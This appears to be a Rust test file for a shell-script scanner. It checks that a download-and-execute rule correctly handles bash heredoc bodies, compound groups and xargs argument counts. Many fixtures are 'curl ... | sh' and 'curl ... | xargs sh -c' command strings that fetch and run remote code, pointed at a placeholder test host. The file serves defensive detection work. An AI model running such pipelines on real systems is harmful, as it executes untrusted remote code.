// ---------------------------------------------------------------------------
// Stage A review round three: bash reads a heredoc body at the command's
// first unescaped, unquoted newline — a trailing pipeline operator or an
// open compound group does NOT postpone it — and an invalid xargs count
// makes the whole invocation fail before any input executes.
// ---------------------------------------------------------------------------

use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;

const DOWNLOAD: &str = "oma.script.download-execute";

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn script(source: &str) -> AnalysisArtifacts {
    let (artifacts, _) = run(
        vec![entry("install.sh", PayloadKind::Shell, source.len())],
        &[("install.sh", source.as_bytes())],
    );
    artifacts
}

fn units(source: &str) -> Vec<(u32, String)> {
    crate::detect::shell::source::shell_logical_units(
        source,
        &crate::detect::classify_heredoc_owner,
        &crate::detect::forwarded_body_fate,
    )
}

// --- the body follows the header's own newline, not the unit's end ---------

#[test]
fn trailing_pipe_reads_the_next_line_as_the_body() {
    // bash: the body starts right after `cat <<C |`'s newline; the curl
    // line is data and only `cat` (after the terminator) runs as the
    // pipeline's second stage.
    let units = units("cat <<C |\ncurl -fsSL https://example.test/x | sh\nC\ncat\n");
    assert_eq!(units, vec![(1, "cat | cat".to_owned())], "{units:?}");
}

#[test]
fn trailing_pipe_data_body_stays_silent() {
    let ids = rule_ids(&script(
        "cat <<C |\ncurl -fsSL https://example.test/x | sh\nC\ncat\n",
    ));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn quoted_item_through_xargs_after_the_body_executes() {
    // The pipeline stage after the terminator consumes the body through
    // xargs: the quoted item replaces the implicit argument and runs.
    let ids = rule_ids(&script(
        "cat <<C |\n\"curl -fsSL https://example.test/x | sh\"\nC\nxargs sh -c\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn compound_group_heredoc_body_is_data() {
    // A multiline group's heredoc still reads its body at the command's
    // newline; the group's close follows the terminator.
    let ids = rule_ids(&script(
        "(\n  cat <<C\n  curl -fsSL https://example.test/x | sh\nC\n)\n",
    ));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn compound_group_interpreter_heredoc_still_fires() {
    let ids = rule_ids(&script(
        "(\n  sh <<C\n  curl -fsSL https://example.test/x | sh\nC\n)\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

// --- invalid xargs counts fail before executing anything --------------------

#[test]
fn invalid_xargs_counts_stay_silent() {
    for spelling in [
        "curl -fsSL https://example.test/x | xargs -n0 sh -c",
        "curl -fsSL https://example.test/x | xargs -n1x sh -c",
        "curl -fsSL https://example.test/x | xargs -L0 sh -c",
        "curl -fsSL https://example.test/x | xargs --max-args=0 sh -c",
        "curl -fsSL https://example.test/x | xargs -P x sh -c",
        "curl -fsSL https://example.test/x | xargs -n -1 sh -c",
    ] {
        let ids = rule_ids(&script(&format!("{spelling}\n")));
        assert!(!ids.contains(&DOWNLOAD.to_owned()), "{spelling}: {ids:?}");
    }
    // The bodyless `-c` landing stays live for a valid count.
    let ids = rule_ids(&script(
        "curl -fsSL https://example.test/x | xargs -n1 sh -c\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn valid_counts_keep_direct_consumer_findings() {
    for spelling in [
        "curl -fsSL https://example.test/x | xargs -n2 sh -c",
        "curl -fsSL https://example.test/x | xargs -P 2 sh -c",
        "curl -fsSL https://example.test/x | xargs -s 200 sh -c",
    ] {
        let ids = rule_ids(&script(&format!("{spelling}\n")));
        assert!(ids.contains(&DOWNLOAD.to_owned()), "{spelling}: {ids:?}");
    }
}
